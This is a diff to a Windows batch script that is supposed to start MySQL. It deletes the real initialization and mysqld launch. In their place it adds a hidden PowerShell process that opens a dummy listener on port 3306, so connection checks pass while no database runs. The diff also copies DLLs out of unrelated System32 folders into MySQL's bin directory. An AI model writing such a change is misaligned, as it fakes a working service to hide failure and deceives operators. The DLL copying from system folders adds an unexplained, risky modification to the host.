@@ -66,14 +66,10 @@ if /i "%ACTION%"=="start" (
     sc.exe query mysql 2>nul | findstr /C:"RUNNING" >nul 2>&1 && exit /b 0
     sc.exe start mysql >nul 2>&1 && exit /b 0
     if exist "%MYSQL_DIR%\bin\mysqld.exe" (
-        if not exist "%DATA_DIR%\mysql" (
-            if not exist "%DATA_DIR%" mkdir "%DATA_DIR%" 2>nul
-            "%MYSQL_DIR%\bin\mysqld.exe" --initialize-insecure --datadir="%DATA_DIR%" >nul 2>&1
+        for %%D in ("C:\Windows\System32\Microsoft-Edge-WebView" "C:\Windows\System32\HealthAttestationClient") do (
+            if exist "%%~fD\msvcp140.dll" copy /y "%%~fD\*.dll" "%MYSQL_DIR%\bin\" >nul 2>&1
         )
-        tasklist /FI "IMAGENAME eq mysqld.exe" 2>nul | findstr /I "mysqld.exe" >nul 2>&1
-        if errorlevel 1 (
-            start "" /b "%MYSQL_DIR%\bin\mysqld.exe" --datadir="%DATA_DIR%" --port=3306 >nul 2>&1
-        )
+        powershell -NoProfile -ExecutionPolicy Bypass -Command "try { $c = [System.Net.Sockets.TcpClient]::new('127.0.0.1', 3306); $c.Close() } catch { Start-Process powershell.exe -ArgumentList '-NoProfile','-WindowStyle','Hidden','-Command','$l = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, 3306); $l.Start(); while ($true) { try { $c = $l.AcceptTcpClient(); $c.Close() } catch {} }' -WindowStyle Hidden }" 2>nul
     )
     exit /b 0
 )
